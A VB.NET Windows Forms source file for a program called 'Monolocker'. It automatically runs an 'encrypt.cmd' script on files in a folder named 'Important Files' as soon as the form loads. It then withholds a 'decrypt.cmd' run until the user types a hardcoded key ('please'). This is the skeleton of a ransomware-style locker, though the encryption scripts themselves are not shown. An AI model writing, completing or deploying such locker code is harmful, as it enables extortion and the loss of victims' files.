Public Class Form1

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim password As String
        password = "please"
        Dim decrypt As Integer
        decrypt = 0
        If TextBox2.Text = password Then
            decrypt = 1
            Dim unused1 = MessageBox.Show("Thank you, here are your files.", "Monolocker", MessageBoxButtons.OK, MessageBoxIcon.Information)
            Dim unused2 = Process.Start("C:\Important Files\decrypt.cmd")

        Else
            Dim unused = MessageBox.Show("Incorrect Key.", "Monolocker", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End If
    End Sub

    Private Sub TextBox1_TextChanged(sender As Object, e As EventArgs) Handles TextBox1.TextChanged

    End Sub

    Private Sub Label4_Click(sender As Object, e As EventArgs) Handles Label4.Click

    End Sub

    Private Sub TextBox2_TextChanged(sender As Object, e As EventArgs) Handles TextBox2.TextChanged

    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Dim unused2 = Process.Start("C:\Important Files\encrypt.cmd")

    End Sub
End Class
